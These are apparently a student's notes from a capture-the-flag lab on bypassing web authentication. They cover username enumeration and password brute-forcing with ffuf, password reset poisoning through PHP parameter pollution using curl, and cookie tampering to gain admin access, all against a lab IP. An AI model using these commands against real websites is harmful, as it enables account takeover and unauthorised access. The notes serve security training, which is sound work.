@@ -1,0 +1,213 @@
+In this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.
+
+
+1-username enumeration - 
+in this we bruteforce usernames using ffuf by providing it a usrname wordlist , it tells us what usernames do exist for a signup page and then a hacker can perform bruteforce attacks for weak pass creds ,in other words can further escalate the matter
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.173.5/customers/signup -mr "username already exists"
+
+
+2-Bruteforce
+now that we've got usernames that exist , we will bruterforce the login page by giving ffuf the valid_usernames.txt containing the existing usernames , and a password wordlist file for bruteforce
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.173.5/customers/login -fc 200
+
+we got username steve and pass thunder as output and boom we in da account
+
+
+3-logic flaw
+pass reset poisoning
+ Big picture: App ka scene kya hai?
+
+Acme IT Support website ka password reset flow:
+
+1️ Step 1
+Tu email daalta hai
+→ app check karta:
+“Account exists or not?”
+
+2️ Step 2
+Tu username daalta hai
+→ app bolta:
+“Password reset email bhej diya.”
+
+ Vulnerability kahan hai?
+
+App internally:
+
+Email GET parameter se leta hai
+
+Username POST body se leta hai
+
+But actual email bhejne ke time:
+
+ PHP $_REQUEST variable use karta hai
+
+ PHP $_REQUEST ka chutiya logic
+
+$_REQUEST =
+GET + POST + COOKIE ka mix
+
+Aur agar same key name dono me ho:
+
+email=robert@acmeitsupport.thm   (GET)
+email=attacker@hacker.com       (POST)
+
+
+PHP bolta hai:
+
+POST waala email zyada important 
+
+ So attack kya hai?
+
+Normal request:
+
+curl 'http://10.49.173.5/customers/reset?email=robert@acmeitsupport.thm' \
+-d 'username=robert'
+
+
+→ Reset email goes to robert@acmeitsupport.thm
+
+But attacker version 
+curl 'http://10.49.173.5/customers/reset?email=robert@acmeitsupport.thm' \
+-d 'username=robert&email=attacker@hacker.com'
+
+
+Now:
+
+App verifies Robert using GET email
+
+But sends reset link to POST email 
+→ attacker@hacker.com
+
+ So what did we just do?
+
+We tricked the app into:
+
+“Reset Robert’s password
+but send link to attacker.”
+
+This is called:
+
+ Password Reset Poisoning
+ Parameter Pollution
+ Logic Flaw
+
+ Ab last part kya bol raha hai?
+
+They say:
+
+1️ Create your own account
+on Acme IT support.
+
+You’ll get email like:
+
+yourname@customer.acmeitsupport.thm
+
+
+2️ Run this evil curl again
+but change POST email to YOUR email:
+
+curl 'http://10.49.173.5/customers/reset?email=robert@acmeitsupport.thm' \
+-d 'username=robert&email=yourname@customer.acmeitsupport.thm'
+
+
+3️ What happens?
+
+App thinks:
+
+“Robert asked for reset.”
+
+But reset link goes to:
+
+yourname@customer.acmeitsupport.thm
+
+4️ Where does that link show up?
+
+In your support tickets
+(because Acme IT Support emails = ticket system)
+
+5️ Open ticket → click link
+→ You’re now logged in as Robert 
+
+6️ Go to Robert’s support tickets
+→ One of them has a flag 
+
+ So final answer logic
+
+They’re asking:
+
+“What is the flag from Robert’s support ticket?”
+
+Meaning:
+
+You must:
+
+Exploit reset poisoning
+
+Hijack Robert’s account
+
+Read his ticket
+
+Copy the flag string
+
+ One-liner explanation
+
+App verifies user using GET email
+but sends reset link using POST email
+because of PHP $_REQUEST.
+So attacker hijacks password reset. 
+
+ Ultra-simple TL;DR
+
+1️ App uses GET + POST badly
+2️ POST email overrides GET email
+3️ Reset link sent to attacker
+4️ Attacker logs in as Robert
+5️ Attacker reads flag from ticket
+
+ What vulnerability is this?
+
+Password Reset Poisoning
+Parameter Pollution
+Business Logic Flaw
+CWE-640
+
+One-Line Conclusion
+
+The application validates the victim’s identity using GET parameters but delivers the reset link using POST parameters, enabling password reset poisoning through parameter pollution.
+
+
+4- cookie tampering
+we send curl requests to the page and try to edit the cookies by making admin=true and get the admin privileges after logging in using logged_in=true
+
+Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the HTTP In Detail room on task 6.
+
+
+
+Plain Text
+
+The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:
+
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+Set-Cookie: admin=false; Max-Age=3600; Path=/
+
+We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.
+
+First, we'll start just by requesting the target page:
+
+Curl Request 1
+user@tryhackme$ curl http://10.49.173.5/cookie-test
+We can see we are returned a message of: Not Logged In
+
+Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:
+
+Curl Request 2
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.49.173.5/cookie-test
+We are given the message: Logged In As A User
+
+Finally, we'll send one last request setting both the logged_in and admin cookie to true:
+
+Curl Request 3
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.49.173.5/cookie-test
+This returns the result: Logged In As An Admin as well as a flag which you can use to answer question one.
+
+sometimes ookies using hash9ng and encoding , we have to decrypt after knowing the hash fnk thriugh online available tools and then do cookie tampering
